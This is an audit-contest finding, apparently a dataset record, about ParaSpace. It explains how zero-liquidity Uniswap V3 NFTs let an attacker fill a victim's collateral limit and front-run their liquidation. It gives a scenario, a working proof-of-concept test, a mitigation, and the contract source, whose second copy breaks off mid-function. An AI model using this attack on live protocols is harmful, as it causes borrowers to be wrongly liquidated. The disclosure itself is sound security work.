{
  "Title": "[M-10] Users can be locked out of providing Uniswap V3 NFTs as collateral",
  "Content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/libraries/MintableERC721Logic.sol#L248><br>\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/libraries/MintableERC721Logic.sol#L107>\n\nA malicious actor can disallow supplying of Uniswap V3 NFT tokens as collateral for any user. This can be exploited as a front-running attack that disallows a borrower to provide more Uniswap V3 LP tokens as collateral and save their collateral from being liquidated.\n\n### Proof of Concept\n\nThe protocol allows users to provide Uniswap V3 NFT tokens as collateral. Since these tokens can be minted freely, a malicious actor may provide a huge number of such tokens as collateral and impose high gas consumption by the `calculateUserAccountData` function of `GenericLogic` (which calculates user's collateral and debt value). Potentially, this can lead to out of gas errors during collateral/debt values calculation. To protect against this attack, a limit on the number of Uniswap V3 NFTs a user can provide as collateral was added ([NTokenUniswapV3.sol#L33-L35](https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/NTokenUniswapV3.sol#L33-L35)):\n\n```solidity\nconstructor(IPool pool) NToken(pool, true) {\n    _ERC721Data.balanceLimit = 30;\n}\n```\n\nThe limit is enforced during Uniswap V3 NToken minting and transferring ([MintableERC721Logic.sol#L247-L248](https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/libraries/MintableERC721Logic.sol#L247-L248), [MintableERC721Logic.sol#L106-L107](https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/libraries/MintableERC721Logic.sol#L106-L107), [MintableERC721Logic.sol#L402-L414](https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/libraries/MintableERC721Logic.sol#L402-L414)):\n\n```solidity\nuint64 newBalance = oldBalance + uint64(tokenData.length);\n_checkBalanceLimit(erc721Data, ATOMIC_PRICING, newBalance);\n```\n\n```solidity\nuint64 newRecipientBalance = oldRecipientBalance + 1;\n_checkBalanceLimit(erc721Data, ATOMIC_PRICING, newRecipientBalance);\n```\n\n```solidity\nfunction _checkBalanceLimit(\n    MintableERC721Data storage erc721Data,\n    bool ATOMIC_PRICING,\n    uint64 balance\n) private view {\n    if (ATOMIC_PRICING) {\n        uint64 balanceLimit = erc721Data.balanceLimit;\n        require(\n            balanceLimit == 0 || balance <= balanceLimit,\n            Errors.NTOKEN_BALANCE_EXCEEDED\n        );\n    }\n}\n```\n\nWhile protecting from the attack mentioned above, this creates a new attack vector: a malicious actor can send many Uniswap V3 NTokens to a victim and lock them out of adding more Uniswap V3 NTokens as collateral. This attack is viable and cheap because *Uniswap V3 NFTs can have 0 liquidity*, thus the attacker would only need to pay transaction fees, which are cheap on L2 networks.\n\n#### Exploit Scenario\n\n1.  Bob provides Uniswap V3 NFTs as collateral on Paraspace and borrows other tokens.\n2.  Due to extreme market conditions, Bob's health factor is getting closer to the liquidation threshold.\n3.  Bob, while being an active liquidity provider on Uniswap, supplies another Uniswap V3 NFT as a collateral.\n4.  Alice runs liquidation and front-running bots. One of her bots notices that Bob is trying to increase his collateral value with a Uniswap V3 NFT.\n5.  Alice's bot mints multiple Uniswap V3 NFTs using the same asset tokens by removing all liquidity from tokens after they were minted.\n6.  Alice's bot supplies the newly minted NFTs on behalf of Bob. Bob's balance of Uniswap V3 NFTs reaches the maximal allowed.\n7.  Bob's transaction to add another Uniswap V3 NFT as collateral fails due to the balance limit being reached.\n8.  While Bob is trying to figure out what's happened and before he provides collateral in other tokens or withdraws the empty NTokens, Alice's bot liquidates Bob's debt.\n\n```ts\n// paraspace-core/test/_uniswapv3_position_control.spec.ts\nit(\"allows to fill balanceLimit of another user cheaply [AUDIT]\", async () => {\n  const {\n    users: [user1, user2],\n    dai,\n    weth,\n    nftPositionManager,\n    nUniswapV3,\n    pool\n  } = testEnv;\n\n  // user1 has 1 token initially.\n  expect(await nUniswapV3.balanceOf(user1.address)).to.eq(\"1\");\n\n  // Set the limit to 5 tokens so the test runs faster.\n  let totalTokens = 5;\n  await waitForTx(await nUniswapV3.setBalanceLimit(totalTokens));\n\n  const userDaiAmount = await convertToCurrencyDecimals(dai.address, \"10000\");\n  const userWethAmount = await convertToCurrencyDecimals(weth.address, \"10\");\n  await fund({ token: dai, user: user2, amount: userDaiAmount });\n  await fund({ token: weth, user: user2, amount: userWethAmount });\n  let nft = nftPositionManager.connect(user2.signer);\n  await approveTo({ target: nftPositionManager.address, token: dai, user: user2 });\n  await approveTo({ target: nftPositionManager.address, token: weth, user: user2 });\n  const fee = 3000;\n  const tickSpacing = fee / 50;\n  const lowerPrice = encodeSqrtRatioX96(1, 10000);\n  const upperPrice = encodeSqrtRatioX96(1, 100);\n  await nft.setApprovalForAll(nftPositionManager.address, true);\n  await nft.setApprovalForAll(pool.address, true);\n  const MaxUint128 = DRE.ethers.BigNumber.from(2).pow(128).sub(1);\n\n  let daiAvailable, wethAvailable;\n\n  // user2 is going to mint 4 Uniswap V3 NFTs using the same amount of DAI and WETH.\n  // After each mint, user2 removes all liquidity from a token and uses it to mint\n  // next token.\n  for (let tokenId = 2; tokenId <= totalTokens; tokenId++) {\n    daiAvailable = await dai.balanceOf(user2.address);\n    wethAvailable = await weth.balanceOf(user2.address);\n\n    await mintNewPosition({\n      nft: nft,\n      token0: dai,\n      token1: weth,\n      fee: fee,\n      user: user2,\n      tickSpacing: tickSpacing,\n      lowerPrice,\n      upperPrice,\n      token0Amount: daiAvailable,\n      token1Amount: wethAvailable,\n    });\n\n    const liquidity = (await nftPositionManager.positions(tokenId)).liquidity;\n\n    await nft.decreaseLiquidity({\n      tokenId: tokenId,\n      liquidity: liquidity,\n      amount0Min: 0,\n      amount1Min: 0,\n      deadline: 2659537628,\n    });\n\n    await nft.collect({\n      tokenId: tokenId,\n      recipient: user2.address,\n      amount0Max: MaxUint128,\n      amount1Max: MaxUint128,\n    });\n\n    expect((await nftPositionManager.positions(tokenId)).liquidity).to.eq(\"0\");\n  }\n\n  // user2 supplies the 4 UniV3 NFTs to user1.\n  const tokenData = Array.from({ length: totalTokens - 1 }, (_, i) => {\n    return {\n      tokenId: i + 2,\n      useAsCollateral: true\n    }\n  });\n  await waitForTx(\n    await pool\n      .connect(user2.signer)\n      .supplyERC721(\n        nftPositionManager.address,\n        tokenData,\n        user1.address,\n        0,\n        {\n          gasLimit: 12_450_000,\n        }\n      )\n  );\n\n  expect(await nUniswapV3.balanceOf(user2.address)).to.eq(0);\n  expect(await nUniswapV3.balanceOf(user1.address)).to.eq(totalTokens);\n\n  // user1 tries to supply another UniV3 NFT but fails, since the limit has\n  // already been reached.\n  await fund({ token: dai, user: user1, amount: userDaiAmount });\n  await fund({ token: weth, user: user1, amount: userWethAmount });\n  nft = nftPositionManager.connect(user1.signer);\n  await mintNewPosition({\n    nft: nft,\n    token0: dai,\n    token1: weth,\n    fee: fee,\n    user: user1,\n    tickSpacing: tickSpacing,\n    lowerPrice,\n    upperPrice,\n    token0Amount: userDaiAmount,\n    token1Amount: userWethAmount,\n  });\n\n  await expect(\n    pool\n      .connect(user1.signer)\n      .supplyERC721(\n        nftPositionManager.address,\n        [{ tokenId: totalTokens + 1, useAsCollateral: true }],\n        user1.address,\n        0,\n        {\n          gasLimit: 12_450_000,\n        }\n      )\n  ).to.be.revertedWith(\"120\");  //ntoken balance exceed limit.\n\n  expect(await nUniswapV3.balanceOf(user1.address)).to.eq(totalTokens);\n\n  // The cost of the attack was low. user2's balance of DAI and WETH\n  // hasn't changed, only the rounding error of Uniswap V3 was subtracted.\n  expect(await dai.balanceOf(user2.address)).to.eq(\"9999999999999999999996\");\n  expect(await weth.balanceOf(user2.address)).to.eq(\"9999999999999999996\");\n});\n```\n\n### Recommended Mitigation Steps\n\nConsider disallowing supplying Uniswap V3 NFTs that have 0 liquidity and removing the entire liquidity from tokens that have already been supplied. Setting a minimal required liquidity for a Uniswap V3 NFT will make this attack more costly, however it won't remove the attack vector entirely.\n\n**[LSDan (judge) decreased severity to Medium](https://github.com/code-423n4/2022-11-paraspace-findings/issues/334#issuecomment-1375749711)**\n\n\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/contests/2022-11-paraspace-contest",
  "Code": [
    {
      "filename": "paraspace-core/contracts/protocol/tokenization/libraries/MintableERC721Logic.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.10;\nimport {ApeCoinStaking} from \"../../../dependencies/yoga-labs/ApeCoinStaking.sol\";\nimport {IERC721} from \"../../../dependencies/openzeppelin/contracts/IERC721.sol\";\nimport {SafeERC20} from \"../../../dependencies/openzeppelin/contracts/SafeERC20.sol\";\nimport {IERC20} from \"../../../dependencies/openzeppelin/contracts/IERC20.sol\";\nimport \"../../../interfaces/IRewardController.sol\";\nimport \"../../libraries/types/DataTypes.sol\";\nimport \"../../../interfaces/IPool.sol\";\nimport {Errors} from \"../../libraries/helpers/Errors.sol\";\n\nstruct UserState {\n    uint64 balance;\n    uint64 collateralizedBalance;\n    uint128 additionalData;\n}\n\nstruct MintableERC721Data {\n    // Token name\n    string name;\n    // Token symbol\n    string symbol;\n    // Mapping from token ID to owner address\n    mapping(uint256 => address) owners;\n    // Mapping from owner to list of owned token IDs\n    mapping(address => mapping(uint256 => uint256)) ownedTokens;\n    // Mapping from token ID to index of the owner tokens list\n    mapping(uint256 => uint256) ownedTokensIndex;\n    // Array with all token ids, used for enumeration\n    uint256[] allTokens;\n    // Mapping from token id to position in the allTokens array\n    mapping(uint256 => uint256) allTokensIndex;\n    // Map of users address and their state data (userAddress => userStateData)\n    mapping(address => UserState) userState;\n    // Mapping from token ID to approved address\n    mapping(uint256 => address) tokenApprovals;\n    // Mapping from owner to operator approvals\n    mapping(address => mapping(address => bool)) operatorApprovals;\n    // Map of allowances (delegator => delegatee => allowanceAmount)\n    mapping(address => mapping(address => uint256)) allowances;\n    IRewardController rewardController;\n    uint64 balanceLimit;\n    mapping(uint256 => bool) isUsedAsCollateral;\n    mapping(uint256 => DataTypes.Auction) auctions;\n}\n\n/**\n * @title MintableERC721 library\n *\n * @notice Implements the base logic for MintableERC721\n */\nlibrary MintableERC721Logic {\n    /**\n     * @dev Emitted when `tokenId` token is transferred from `from` to `to`.\n     */\n    event Transfer(\n        address indexed from,\n        address indexed to,\n        uint256 indexed tokenId\n    );\n\n    /**\n     * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.\n     */\n    event Approval(\n        address indexed owner,\n        address indexed approved,\n        uint256 indexed tokenId\n    );\n\n    /**\n     * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.\n     */\n    event ApprovalForAll(\n        address indexed owner,\n        address indexed operator,\n        bool approved\n    );\n\n    function executeTransfer(\n        MintableERC721Data storage erc721Data,\n        IPool POOL,\n        bool ATOMIC_PRICING,\n        address from,\n        address to,\n        uint256 tokenId\n    ) public {\n        require(\n            erc721Data.owners[tokenId] == from,\n            \"ERC721: transfer from incorrect owner\"\n        );\n        require(to != address(0), \"ERC721: transfer to the zero address\");\n        require(\n            !isAuctioned(erc721Data, POOL, tokenId),\n            Errors.TOKEN_IN_AUCTION\n        );\n\n        _beforeTokenTransfer(erc721Data, from, to, tokenId);\n\n        // Clear approvals from the previous owner\n        _approve(erc721Data, address(0), tokenId);\n\n        uint64 oldSenderBalance = erc721Data.userState[from].balance;\n        erc721Data.userState[from].balance = oldSenderBalance - 1;\n        uint64 oldRecipientBalance = erc721Data.userState[to].balance;\n        uint64 newRecipientBalance = oldRecipientBalance + 1;\n        _checkBalanceLimit(erc721Data, ATOMIC_PRICING, newRecipientBalance);\n        erc721Data.userState[to].balance = newRecipientBalance;\n        erc721Data.owners[tokenId] = to;\n\n        if (from != to && erc721Data.auctions[tokenId].startTime > 0) {\n            delete erc721Data.auctions[tokenId];\n        }\n\n        IRewardController rewardControllerLocal = erc721Data.rewardController;\n        if (address(rewardControllerLocal) != address(0)) {\n            uint256 oldTotalSupply = erc721Data.allTokens.length;\n            rewardControllerLocal.handleAction(\n                from,\n                oldTotalSupply,\n                oldSenderBalance\n            );\n            if (from != to) {\n                rewardControllerLocal.handleAction(\n                    to,\n                    oldTotalSupply,\n                    oldRecipientBalance\n                );\n            }\n        }\n\n        emit Transfer(from, to, tokenId);\n    }\n\n    function executeTransferCollateralizable(\n        MintableERC721Data storage erc721Data,\n        IPool POOL,\n        bool ATOMIC_PRICING,\n        address from,\n        address to,\n        uint256 tokenId\n    ) external returns (bool isUsedAsCollateral_) {\n        isUsedAsCollateral_ = erc721Data.isUsedAsCollateral[tokenId];\n\n        if (from != to && isUsedAsCollateral_) {\n            erc721Data.userState[from].collateralizedBalance -= 1;\n            delete erc721Data.isUsedAsCollateral[tokenId];\n        }\n\n        executeTransfer(erc721Data, POOL, ATOMIC_PRICING, from, to, tokenId);\n    }\n\n    function executeSetIsUsedAsCollateral(\n        MintableERC721Data storage erc721Data,\n        IPool POOL,\n        uint256 tokenId,\n        bool useAsCollateral,\n        address sender\n    ) internal returns (bool) {\n        if (erc721Data.isUsedAsCollateral[tokenId] == useAsCollateral)\n            return false;\n\n        address owner = erc721Data.owners[tokenId];\n        require(owner == sender, \"not owner\");\n\n        if (!useAsCollateral) {\n            require(\n                !isAuctioned(erc721Data, POOL, tokenId),\n                Errors.TOKEN_IN_AUCTION\n            );\n        }\n\n        uint64 collateralizedBalance = erc721Data\n            .userState[owner]\n            .collateralizedBalance;\n        erc721Data.isUsedAsCollateral[tokenId] = useAsCollateral;\n        collateralizedBalance = useAsCollateral\n            ? collateralizedBalance + 1\n            : collateralizedBalance - 1;\n        erc721Data\n            .userState[owner]\n            .collateralizedBalance = collateralizedBalance;\n\n        return true;\n    }\n\n    function executeMintMultiple(\n        MintableERC721Data storage erc721Data,\n        bool ATOMIC_PRICING,\n        address to,\n        DataTypes.ERC721SupplyParams[] calldata tokenData\n    )\n        external\n        returns (\n            uint64 oldCollateralizedBalance,\n            uint64 newCollateralizedBalance\n        )\n    {\n        require(to != address(0), \"ERC721: mint to the zero address\");\n        uint64 oldBalance = erc721Data.userState[to].balance;\n        oldCollateralizedBalance = erc721Data\n            .userState[to]\n            .collateralizedBalance;\n        uint256 oldTotalSupply = erc721Data.allTokens.length;\n        uint64 collateralizedTokens = 0;\n\n        for (uint256 index = 0; index < tokenData.length; index++) {\n            uint256 tokenId = tokenData[index].tokenId;\n\n            require(\n                !_exists(erc721Data, tokenId),\n                \"ERC721: token already minted\"\n            );\n\n            _addTokenToAllTokensEnumeration(\n                erc721Data,\n                tokenId,\n                oldTotalSupply + index\n            );\n            _addTokenToOwnerEnumeration(\n                erc721Data,\n                to,\n                tokenId,\n                oldBalance + index\n            );\n\n            erc721Data.owners[tokenId] = to;\n\n            if (\n                tokenData[index].useAsCollateral &&\n                !erc721Data.isUsedAsCollateral[tokenId]\n            ) {\n                erc721Data.isUsedAsCollateral[tokenId] = true;\n                collateralizedTokens++;\n            }\n\n            emit Transfer(address(0), to, tokenId);\n        }\n\n        newCollateralizedBalance =\n            oldCollateralizedBalance +\n            collateralizedTokens;\n        erc721Data\n            .userState[to]\n            .collateralizedBalance = newCollateralizedBalance;\n\n        uint64 newBalance = oldBalance + uint64(tokenData.length);\n        _checkBalanceLimit(erc721Data, ATOMIC_PRICING, newBalance);\n        erc721Data.userState[to].balance = newBalance;\n\n        // calculate incentives\n        IRewardController rewardControllerLocal = erc721Data.rewardController;\n        if (address(rewardControllerLocal) != address(0)) {\n            rewardControllerLocal.handleAction(to, oldTotalSupply, oldBalance);\n        }\n\n        return (oldCollateralizedBalance, newCollateralizedBalance);\n    }\n\n    function executeBurnMultiple(\n        MintableERC721Data storage erc721Data,\n        IPool POOL,\n        address user,\n        uint256[] calldata tokenIds\n    )\n        external\n        returns (\n            uint64 oldCollateralizedBalance,\n            uint64 newCollateralizedBalance\n        )\n    {\n        uint64 burntCollateralizedTokens = 0;\n        uint64 balanceToBurn;\n        uint256 oldTotalSupply = erc721Data.allTokens.length;\n        uint256 oldBalance = erc721Data.userState[user].balance;\n        oldCollateralizedBalance = erc721Data\n            .userState[user]\n            .collateralizedBalance;\n\n        for (uint256 index = 0; index < tokenIds.length; index++) {\n            uint256 tokenId = tokenIds[index];\n            address owner = erc721Data.owners[tokenId];\n            require(owner == user, \"not the owner of Ntoken\");\n            require(\n                !isAuctioned(erc721Data, POOL, tokenId),\n                Errors.TOKEN_IN_AUCTION\n            );\n\n            _removeTokenFromAllTokensEnumeration(\n                erc721Data,\n                tokenId,\n                oldTotalSupply - index\n            );\n            _removeTokenFromOwnerEnumeration(\n                erc721Data,\n                user,\n                tokenId,\n                oldBalance - index\n            );\n\n            // Clear approvals\n            _approve(erc721Data, address(0), tokenId);\n\n            balanceToBurn++;\n            delete erc721Data.owners[tokenId];\n\n            if (erc721Data.auctions[tokenId].startTime > 0) {\n                delete erc721Data.auctions[tokenId];\n            }\n\n            if (erc721Data.isUsedAsCollateral[tokenId]) {\n                delete erc721Data.isUsedAsCollateral[tokenId];\n                burntCollateralizedTokens++;\n            }\n            emit Transfer(owner, address(0), tokenId);\n        }\n\n        erc721Data.userState[user].balance -= balanceToBurn;\n        newCollateralizedBalance =\n            oldCollateralizedBalance -\n            burntCollateralizedTokens;\n        erc721Data\n            .userState[user]\n            .collateralizedBalance = newCollateralizedBalance;\n\n        // calculate incentives\n        IRewardController rewardControllerLocal = erc721Data.rewardController;\n\n        if (address(rewardControllerLocal) != address(0)) {\n            rewardControllerLocal.handleAction(\n                user,\n                oldTotalSupply,\n                oldBalance\n            );\n        }\n\n        return (oldCollateralizedBalance, newCollateralizedBalance);\n    }\n\n    function executeApprove(\n        MintableERC721Data storage erc721Data,\n        address to,\n        uint256 tokenId\n    ) external {\n        _approve(erc721Data, to, tokenId);\n    }\n\n    function _approve(\n        MintableERC721Data storage erc721Data,\n        address to,\n        uint256 tokenId\n    ) private {\n        erc721Data.tokenApprovals[tokenId] = to;\n        emit Approval(erc721Data.owners[tokenId], to, tokenId);\n    }\n\n    function executeApprovalForAll(\n        MintableERC721Data storage erc721Data,\n        address owner,\n        address operator,\n        bool approved\n    ) external {\n        require(owner != operator, \"ERC721: approve to caller\");\n        erc721Data.operatorApprovals[owner][operator] = approved;\n        emit ApprovalForAll(owner, operator, approved);\n    }\n\n    function executeStartAuction(\n        MintableERC721Data storage erc721Data,\n        IPool POOL,\n        uint256 tokenId\n    ) external {\n        require(\n            !isAuctioned(erc721Data, POOL, tokenId),\n            Errors.AUCTION_ALREADY_STARTED\n        );\n        require(\n            _exists(erc721Data, tokenId),\n            \"ERC721: startAuction for nonexistent token\"\n        );\n        erc721Data.auctions[tokenId] = DataTypes.Auction({\n            startTime: block.timestamp\n        });\n    }\n\n    function executeEndAuction(\n        MintableERC721Data storage erc721Data,\n        IPool POOL,\n        uint256 tokenId\n    ) external {\n        require(\n            isAuctioned(erc721Data, POOL, tokenId),\n            Errors.AUCTION_NOT_STARTED\n        );\n        require(\n            _exists(erc721Data, tokenId),\n            \"ERC721: endAuction for nonexistent token\"\n        );\n        delete erc721Data.auctions[tokenId];\n    }\n\n    function _checkBalanceLimit(\n        MintableERC721Data storage erc721Data,\n        bool ATOMIC_PRICING,\n        uint64 balance\n    ) private view {\n        if (ATOMIC_PRICING) {\n            uint64 balanceLimit = erc721Data.balanceLimit;\n            require(\n                balanceLimit == 0 || balance <= balanceLimit,\n                Errors.NTOKEN_BALANCE_EXCEEDED\n            );\n        }\n    }\n\n    function _exists(MintableERC721Data storage erc721Data, uint256 tokenId)\n        private\n        view\n        returns (bool)\n    {\n        return erc721Data.owners[tokenId] != address(0);\n    }\n\n    function isAuctioned(\n        MintableERC721Data storage erc721Data,\n        IPool POOL,\n        uint256 tokenId\n    ) public view returns (bool) {\n        return\n            erc721Data.auctions[tokenId].startTime >\n            POOL\n                .getUserConfiguration(erc721Data.owners[tokenId])\n                .auctionValidityTime;\n    }\n\n    /**\n     * @dev Hook that is called before any token transfer. This includes minting\n     * and burning.\n     *\n     * Calling conditions:\n     *\n     * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be\n     * transferred to `to`.\n     * - When `from` is zero, `tokenId` will be minted for `to`.\n     * - When `to` is zero, ``from``'s `tokenId` will be burned.\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _beforeTokenTransfer(\n        MintableERC721Data storage erc721Data,\n        address from,\n        address to,\n        uint256 tokenId\n    ) private {\n        if (from == address(0)) {\n            uint256 length = erc721Data.allTokens.length;\n            _addTokenToAllTokensEnumeration(erc721Data, tokenId, length);\n        } else if (from != to) {\n            uint256 userBalance = erc721Data.userState[from].balance;\n            _removeTokenFromOwnerEnumeration(\n                erc721Data,\n                from,\n                tokenId,\n                userBalance\n            );\n        }\n        if (to == address(0)) {\n            uint256 length = erc721Data.allTokens.length;\n            _removeTokenFromAllTokensEnumeration(erc721Data, tokenId, length);\n        } else if (to != from) {\n            uint256 length = erc721Data.userState[to].balance;\n            _addTokenToOwnerEnumeration(erc721Data, to, tokenId, length);\n        }\n    }\n\n    /**\n     * @dev Private function to add a token to this extension's ownership-tracking data structures.\n     * @param to address representing the new owner of the given token ID\n     * @param tokenId uint256 ID of the token to be added to the tokens list of the given address\n     */\n    function _addTokenToOwnerEnumeration(\n        MintableERC721Data storage erc721Data,\n        address to,\n        uint256 tokenId,\n        uint256 length\n    ) private {\n        erc721Data.ownedTokens[to][length] = tokenId;\n        erc721Data.ownedTokensIndex[tokenId] = length;\n    }\n\n    /**\n     * @dev Private function to add a token to this extension's token tracking data structures.\n     * @param tokenId uint256 ID of the token to be added to the tokens list\n     */\n    function _addTokenToAllTokensEnumeration(\n        MintableERC721Data storage erc721Data,\n        uint256 tokenId,\n        uint256 length\n    ) private {\n        erc721Data.allTokensIndex[tokenId] = length;\n        erc721Data.allTokens.push(tokenId);\n    }\n\n    /**\n     * @dev Private function to remove a token from this extension's ownership-tracking data structures. Note that\n     * while the token is not assigned a new owner, the `_ownedTokensIndex` mapping is _not_ updated: this allows for\n     * gas optimizations e.g. when performing a transfer operation (avoiding double writes).\n     * This has O(1) time complexity, but alters the order of the _ownedTokens array.\n     * @param from address representing the previous owner of the given token ID\n     * @param tokenId uint256 ID of the token to be removed from the tokens list of the given address\n     */\n    function _removeTokenFromOwnerEnumeration(\n        MintableERC721Data storage erc721Data,\n        address from,\n        uint256 tokenId,\n        uint256 userBalance\n    ) private {\n        // To prevent a gap in from's tokens array, we store the last token in the index of the token to delete, and\n        // then delete the last slot (swap and pop).\n\n        uint256 lastTokenIndex = userBalance - 1;\n        uint256 tokenIndex = erc721Data.ownedTokensIndex[tokenId];\n\n        // When the token to delete is the last token, the swap operation is unnecessary\n        if (tokenIndex != lastTokenIndex) {\n            uint256 lastTokenId = erc721Data.ownedTokens[from][lastTokenIndex];\n\n            erc721Data.ownedTokens[from][tokenIndex] = lastTokenId; // Move the last token to the slot of the to-delete token\n            erc721Data.ownedTokensIndex[lastTokenId] = tokenIndex; // Update the moved token's index\n        }\n\n        // This also deletes the contents at the last position of the array\n        delete erc721Data.ownedTokensIndex[tokenId];\n        delete erc721Data.ownedTokens[from][lastTokenIndex];\n    }\n\n    /**\n     * @dev Private function to remove a token from this extension's token tracking data structures.\n     * This has O(1) time complexity, but alters the order of the _allTokens array.\n     * @param tokenId uint256 ID of the token to be removed from the tokens list\n     */\n    function _removeTokenFromAllTokensEnumeration(\n        MintableERC721Data storage erc721Data,\n        uint256 tokenId,\n        uint256 length\n    ) private {\n        // To prevent a gap in the tokens array, we store the last token in the index of the token to delete, and\n        // then delete the last slot (swap and pop).\n\n        uint256 lastTokenIndex = length - 1;\n        uint256 tokenIndex = erc721Data.allTokensIndex[tokenId];\n\n        // When the token to delete is the last token, the swap operation is unnecessary. However, since this occurs so\n        // rarely (when the last minted token is burnt) that we still do the swap here to avoid the gas cost of adding\n        // an 'if' statement (like in _removeTokenFromOwnerEnumeration)\n        uint256 lastTokenId = erc721Data.allTokens[lastTokenIndex];\n\n        erc721Data.allTokens[tokenIndex] = lastTokenId; // Move the last token to the slot of the to-delete token\n        erc721Data.allTokensIndex[lastTokenId] = tokenIndex; // Update the moved token's index\n\n        // This also deletes the contents at the last position of the array\n        delete erc721Data.allTokensIndex[tokenId];\n        erc721Data.allTokens.pop();\n    }\n}"
    },
    {
      "filename": "paraspace-core/contracts/protocol/tokenization/libraries/MintableERC721Logic.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.10;\nimport {ApeCoinStaking} from \"../../../dependencies/yoga-labs/ApeCoinStaking.sol\";\nimport {IERC721} from \"../../../dependencies/openzeppelin/contracts/IERC721.sol\";\nimport {SafeERC20} from \"../../../dependencies/openzeppelin/contracts/SafeERC20.sol\";\nimport {IERC20} from \"../../../dependencies/openzeppelin/contracts/IERC20.sol\";\nimport \"../../../interfaces/IRewardController.sol\";\nimport \"../../libraries/types/DataTypes.sol\";\nimport \"../../../interfaces/IPool.sol\";\nimport {Errors} from \"../../libraries/helpers/Errors.sol\";\n\nstruct UserState {\n    uint64 balance;\n    uint64 collateralizedBalance;\n    uint128 additionalData;\n}\n\nstruct MintableERC721Data {\n    // Token name\n    string name;\n    // Token symbol\n    string symbol;\n    // Mapping from token ID to owner address\n    mapping(uint256 => address) owners;\n    // Mapping from owner to list of owned token IDs\n    mapping(address => mapping(uint256 => uint256)) ownedTokens;\n    // Mapping from token ID to index of the owner tokens list\n    mapping(uint256 => uint256) ownedTokensIndex;\n    // Array with all token ids, used for enumeration\n    uint256[] allTokens;\n    // Mapping from token id to position in the allTokens array\n    mapping(uint256 => uint256) allTokensIndex;\n    // Map of users address and their state data (userAddress => userStateData)\n    mapping(address => UserState) userState;\n    // Mapping from token ID to approved address\n    mapping(uint256 => address) tokenApprovals;\n    // Mapping from owner to operator approvals\n    mapping(address => mapping(address => bool)) operatorApprovals;\n    // Map of allowances (delegator => delegatee => allowanceAmount)\n    mapping(address => mapping(address => uint256)) allowances;\n    IRewardController rewardController;\n    uint64 balanceLimit;\n    mapping(uint256 => bool) isUsedAsCollateral;\n    mapping(uint256 => DataTypes.Auction) auctions;\n}\n\n/**\n * @title MintableERC721 library\n *\n * @notice Implements the base logic for MintableERC721\n */\nlibrary MintableERC721Logic {\n    /**\n     * @dev Emitted when `tokenId` token is transferred from `from` to `to`.\n     */\n    event Transfer(\n        address indexed from,\n        address indexed to,\n        uint256 indexed tokenId\n    );\n\n    /**\n     * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.\n     */\n    event Approval(\n        address indexed owner,\n        address indexed approved,\n        uint256 indexed tokenId\n    );\n\n    /**\n     * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.\n     */\n    event ApprovalForAll(\n        address indexed owner,\n        address indexed operator,\n        bool approved\n    );\n\n    function executeTransfer(\n        MintableERC721Data storage erc721Data,\n        IPool POOL,\n        bool ATOMIC_PRICING,\n        address from,\n        address to,\n        uint256 tokenId\n    ) public {\n        require(\n            erc721Data.owners[tokenId] == from,\n            \"ERC721: transfer from incorrect owner\"\n        );\n        require(to != address(0), \"ERC721: transfer to the zero address\");\n        require(\n            !isAuctioned(erc721Data, POOL, tokenId),\n            Errors.TOKEN_IN_AUCTION\n        );\n\n        _beforeTokenTransfer(erc721Data, from, to, tokenId);\n\n        // Clear approvals from the previous owner\n        _approve(erc721Data, address(0), tokenId);\n\n        uint64 oldSenderBalance = erc721Data.userState[from].balance;\n        erc721Data.userState[from].balance = oldSenderBalance - 1;\n        uint64 oldRecipientBalance = erc721Data.userState[to].balance;\n        uint64 newRecipientBalance = oldRecipientBalance + 1;\n        _checkBalanceLimit(erc721Data, ATOMIC_PRICING, newRecipientBalance);\n        erc721Data.userState[to].balance = newRecipientBalance;\n        erc721Data.owners[tokenId] = to;\n\n        if (from != to && erc721Data.auctions[tokenId].startTime > 0) {\n            delete erc721Data.auctions[tokenId];\n        }\n\n        IRewardController rewardControllerLocal = erc721Data.rewardController;\n        if (address(rewardControllerLocal) != address(0)) {\n            uint256 oldTotalSupply = erc721Data.allTokens.length;\n            rewardControllerLocal.handleAction(\n                from,\n                oldTotalSupply,\n                oldSenderBalance\n            );\n            if (from != to) {\n                rewardControllerLocal.handleAction(\n                    to,\n                    oldTotalSupply,\n                    oldRecipientBalance\n                );\n            }\n        }\n\n        emit Transfer(from, to, tokenId);\n    }\n\n    function executeTransferCollateralizable(\n        MintableERC721Data storage erc721Data,\n        IPool POOL,\n        bool ATOMIC_PRICING,\n        address from,\n        address to,\n        uint256 tokenId\n    ) external returns (bool isUsedAsCollateral_) {\n        isUsedAsCollateral_ = erc721Data.isUsedAsCollateral[tokenId];\n\n        if (from != to && isUsedAsCollateral_) {\n            erc721Data.userState[from].collateralizedBalance -= 1;\n            delete erc721Data.isUsedAsCollateral[tokenId];\n        }\n\n        executeTransfer(erc721Data, POOL, ATOMIC_PRICING, from, to, tokenId);\n    }\n\n    function executeSetIsUsedAsCollateral(\n        MintableERC721Data storage erc721Data,\n        IPool POOL,\n        uint256 tokenId,\n        bool useAsCollateral,\n        address sender\n    ) internal returns (bool) {\n        if (erc721Data.isUsedAsCollateral[tokenId] == useAsCollateral)\n            return false;\n\n        address owner = erc721Data.owners[tokenId];\n        require(owner == sender, \"not owner\");\n\n        if 